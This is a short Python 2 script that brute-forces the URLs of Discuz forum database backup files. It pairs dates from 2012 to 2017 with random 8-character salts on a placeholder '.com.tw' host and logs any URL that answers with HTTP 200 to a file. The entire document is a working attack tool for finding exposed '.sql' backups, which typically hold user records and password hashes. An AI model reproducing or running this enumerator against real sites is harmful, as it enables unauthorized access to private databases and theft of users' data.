# -*- coding:utf-8 -*-
import random
import string
import urllib
import datetime

def dateRange(beginDate, endDate):
    dates = []
    dt = datetime.datetime.strptime(beginDate, "%y%m%d")
    date = beginDate
    #return dt
    while date <= endDate:
        dates.append(date)
        dt = dt + datetime.timedelta(1)
        date = dt.strftime("%y%m%d")
        
    return dates

def weburl(dates):
     status = ""
     while (status != 200):
          salt = ''.join(random.sample(string.ascii_letters + string.digits, 8))
          guess = ''.join([str(i) for i in random.sample(range(0, 9), 6)])
          site="http://www.xxx.com.tw/discuz/forumdata/backup_eec73d/" + dates + "_" + salt +"-1.sql"
          #site="http://www.xxx.com.tw/discuz/1.txt"
          status = urllib.urlopen(site).code
          #print "Status is " + str(status) + " " +  "str is " + salt + " And " + guess
          # print site
          print "Current:" + dates + "_" + salt
     else:
          f = open('ok.txt', 'a')
          f.write("Status|" + str(status) + "|URL|" + site + "\n")
          f.close()
          print "OK"
          return


if __name__=='__main__':
     dates = dateRange("120418","170227")
     for ii in dates:
          weburl(ii)
